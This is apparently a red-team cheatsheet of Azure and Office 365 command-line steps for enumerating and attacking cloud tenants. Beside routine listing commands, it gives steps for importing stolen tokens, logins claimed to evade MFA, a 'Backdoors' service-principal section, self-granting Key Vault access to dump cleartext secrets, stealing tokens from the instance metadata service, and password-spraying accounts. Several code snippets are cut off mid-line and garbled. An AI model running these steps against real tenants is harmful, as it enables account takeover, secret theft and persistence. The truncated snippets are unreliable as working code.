---
id: facaff67-14ff-43a0-a3ff-9718b5a7e022
name: Microsoft Azure & O365 CLI Tool Cheatsheet
type: cheatsheet
verified: false
created_at: '2020-07-14T19:07:52.525907+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Microsoft Azure & O365 CLI Tool Cheatsheet

**Command** ([[Az PowerShell Module]]):

```bash
Import-Module Az

```

**Command** ([[Authentication]]):

```bash
Connect-AzAccount

```

**Command** ([[Or this way sometimes gets around MFA restrictions]]):

```bash
$credential = Get-Credential
Connect-AzAccount -Credential $credential

```

**Command** ([[Import a context file]]):

```bash
Import-AzContext -Profile 'C:\Temp\Live Tokens\StolenToken.json'

```

**Command** ([[Export a context file]]):

```bash
Save-AzContext -Path C:\Temp\AzureAccessToken.json

```

# Account Information

**Command** ([[List the current Azure contexts available]]):

```bash
Get-AzContext -ListAvailable

```

**Code**: [[
$context = Get-AzContext
$context.Name
$context.A]]

**Command** ([[List subscriptions]]):

```bash
Get-AzSubscription

```

**Command** ([[Choose a subscription]]):

```bash
Select-AzSubscription -SubscriptionID "SubscriptionID"

```

**Command** ([[Get the current user's role assignment]]):

```bash
Get-AzRoleAssignment

```

**Command** ([[List all resources and resource groups]]):

```bash
Get-AzResource
Get-AzResourceGroup

```

**Command** ([[List storage accounts]]):

```bash
Get-AzStorageAccount

```

# WebApps & SQL

**Command** ([[List Azure web applications]]):

```bash
Get-AzAdApplication
Get-AzWebApp

```

**Command** ([[List SQL servers]]):

```bash
Get-AzSQLServer

```

**Command** ([[Individual databases can be listed with information retrieved from the previous command]]):

```bash
Get-AzSqlDatabase -ServerName $ServerName -ResourceGroupName $ResourceGroupName

```

**Command** ([[List SQL Firewall rules]]):

```bash
Get-AzSqlServerFirewallRule –ServerName $ServerName -ResourceGroupName $ResourceGroupName

```

**Command** ([[List SQL Server AD Admins]]):

```bash
Get-AzSqlServerActiveDirectoryAdminstrator -ServerName $ServerName -ResourceGroupName $ResourceGroupName

```

# Runbooks

**Command** ([[List Azure Runbooks]]):

```bash
Get-AzAutomationAccount
Get-AzAutomationRunbook -AutomationAccountName <AutomationAccountName> -ResourceGroupName <ResourceGroupName>

```

**Command** ([[Export a runbook with:]]):

```bash
Export-AzAutomationRunbook -AutomationAccountName $AccountName -ResourceGroupName $ResourceGroupName -Name $RunbookName -OutputFolder .\Desktop\

```

# Virtual Machines

**Command** ([[List VMs and get OS details]]):

```bash
Get-AzVM
$vm = Get-AzVM -Name "VM Name"
$vm.OSProfile

```

**Command** ([[Run commands on VMs]]):

```powershell
Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName -VMName $VMName -CommandId RunPowerShellScript -ScriptPath ./powershell-script.ps1

```

# Networking

**Command** ([[List virtual networks]]):

```bash
Get-AzVirtualNetwork

```

**Command** ([[List public IP addresses assigned to virtual NICs]]):

```bash
Get-AzPublicIpAddress

```

**Command** ([[Get Azure ExpressRoute (VPN) Info]]):

```bash
Get-AzExpressRouteCircuit

```

# Backdoors

**Code**: [[
$spn = New-AzAdServicePrincipal -DisplayName "Web]]

**Command** ([[MSOnline PowerShell Module]]):

```bash
Import-Module MSOnline

```

**Command** ([[Authentication]]):

```bash
Connect-MsolService

```

**Command** ([[Or this way sometimes gets around MFA restrictions]]):

```bash
$credential = Get-Credential
Connect-MsolService -Credential $credential

```

# Account and Directory Information

**Command** ([[List Company Information]]):

```bash
Get-MSolCompanyInformation

```

**Command** ([[List all users]]):

```bash
Get-MSolUser -All

```

**Command** ([[List all groups]]):

```bash
Get-MSolGroup -All

```

**Command** ([[List members of a group (Global Admins in this case)]]):

```bash
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember –GroupObjectId $GUID

```

**Command** ([[List all user attributes]]):

```bash
Get-MSolUser –All | fl

```

**Command** ([[List Service Principals]]):

```bash
Get-MsolServicePrincipal

```

**Code**: [[
$users = Get-MsolUser; foreach($user in $users){$]]

# Az CLI Tool

**Command** ([[Authentication]]):

```bash
az login

```

# Dump Azure Key Vaults

**Command** ([[List out any key vault resources the current account can view]]):

```bash
az keyvault list –query '[].name' --output tsv

```

**Command** ([[With contributor level access you can give yourself the right permissions to obtain secrets.]]):

```bash
az keyvault set-policy --name <KeyVaultname> --upn <YourContributorUsername> --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list

```

**Command** ([[Get URI for Key Vault]]):

```bash
az keyvault secret list --vault-name <KeyVaultName> --query '[].id' --output tsv

```

**Command** ([[Get cleartext secret from keyvault]]):

```bash
az keyvault secret show --id <URI from last command> | ConvertFrom-Json

```

**Command** ([[Metadata Service URL]]):

```bash
http://169.254.169.254/metadata

```

**Command** ([[Get access tokens from the metadata service]]):

```bash
GET 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' HTTP/1.1 Metadata: true

```

# Other Azure & O365 Tools

MicroBurst

Azure security assessment tool

https://github.com/NetSPI/MicroBurst

**Command** ([[Look for open storage blobs]]):

```bash
Invoke-EnumerateAzureBlobs -Base $BaseName

```

**Command** ([[Export SSL/TLS certs]]):

```bash
Get-AzPasswords -ExportCerts Y

```

**Command** ([[Azure Container Registry dump]]):

```bash
Get-AzPasswords
Get-AzACR

```

# PowerZure

Azure security assessment tool

https://github.com/hausec/PowerZure

ROADTools

Framework to interact with Azure AD

https://github.com/dirkjanm/ROADtools

# Stormspotter

Red team tool for graphing Azure and Azure AD objects

https://github.com/Azure/Stormspotter

MSOLSpray

https://github.com/dafthack

**Command** ([[Password spray Azure/O365]]):

```bash
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\userlist.txt -Password Spring2020

```
